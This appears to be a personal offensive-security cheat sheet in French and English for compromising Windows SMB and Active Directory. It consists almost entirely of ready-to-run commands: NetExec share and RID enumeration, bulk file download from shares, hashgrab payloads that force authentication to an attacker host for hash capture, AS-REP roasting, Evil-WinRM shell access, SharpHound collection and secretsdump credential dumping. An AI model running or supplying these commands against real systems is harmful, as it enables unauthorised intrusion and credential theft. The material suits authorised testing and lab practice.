
# SMB
```bash
nxc smb $ip
```
## Hashgrab
Generates scf, url & lnk payloads to put onto a smb share. These force authentication to an attacker machine in order to grab hashes (for example with responder).
```bash
python3 hashgrab.py $ip <output>
```
## liste les shares
```bash
nxc smb $ip --shares
```
### with creds
```bash
crackmapexec smb $ip -u 'user' -p 'PASS' --shares
```
## liste users
```bash
nxc smb $ip -u 'guest' -p '' --rid-brute 10000
````

## download files
```bash
nxc smb $ip -u 'guest' -p '' -M spider_plus -o DOWNLOAD_Flag=True
```

## Creer un serveur smb
```
impacket-smbserver <sharename> $(pwd) -smb2support -user <username> -password <pass>
```
```
impacket-smbserver -ip $ip -port 445 shareName .
```

# AD
#ExploitAD
## AS-Rep ROATING
### liste users dont la pré oauth est désactivé
```bash
GetNPUsers -dc-ip $ip <domainNam>/
```
### ask a TGT in John format
```bash
impacket-GetNPUsers -request 'domainName/' -format john -outputfile hash -dc-ip $ip
```

## EvilWinrm
```bash
 evil-winrm -i htb -u 'user' -p 'pass'
```
*Evil-WinRM* PS C:\\Users\\username\\Documents> 
```bash
.\SharpHound.exe --CollectionMethods All --LdapUsername 'username' --LdapPassword 'pass' --Domain 'domiain.local' --ZipFileName ad.zip --OutputDirectory C:\Users\username\Documents\
```

```bash
impacket-secretsdump domain.local/username:pass@$ip
```

